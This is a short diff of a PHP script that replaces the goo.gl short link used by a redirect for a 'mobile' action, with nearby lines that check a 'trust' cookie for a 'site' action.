@@ -115,7 +115,7 @@
   $id = isset(explode(".", $id)[0]) ? explode(".", $id)[0] : $id;
 
   if($action == 'mobile'){
-    header('Location: https://goo.gl/M8ZvRN');
+    header('Location: https://goo.gl/0fuz7S');
     
   }else if($action == 'site'){
     if(isset($_COOKIE["trust"])){
